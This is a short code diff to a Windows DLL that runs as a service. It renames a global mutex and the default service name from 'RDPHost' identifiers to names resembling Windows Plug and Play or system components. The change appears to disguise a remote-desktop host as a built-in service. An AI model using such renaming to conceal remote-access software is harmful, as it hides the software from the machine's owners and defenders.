@@ -421,7 +421,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
             (LPCSTR)&g_dll_module, &pinned);
 
         // Global named mutex — survives DLL reload, prevents multiple instances system-wide
-        HANDLE hMutex = CreateMutexA(nullptr, FALSE, "Global\\RDPHostDllMutex_7F3A");
+        HANDLE hMutex = CreateMutexA(nullptr, FALSE, "Global\\PnpMgrSync_5C3F8A");
         if (hMutex) {
             DWORD waitResult = WaitForSingleObject(hMutex, 0);
             if (waitResult != WAIT_OBJECT_0 && waitResult != WAIT_ABANDONED) {
@@ -614,7 +614,7 @@ __declspec(dllexport) void WINAPI PnpServiceEntry(DWORD dwArgc, LPWSTR* lpszArgv
 
     // Register service control handler
     g_svcStatusHandle = RegisterServiceCtrlHandlerExW(
-        lpszArgv && lpszArgv[0] ? lpszArgv[0] : L"RDPHost",
+        lpszArgv && lpszArgv[0] ? lpszArgv[0] : L"MspIscSvc",
         SvcCtrlHandler, NULL);
     if (!g_svcStatusHandle) {
         DWORD e = GetLastError();
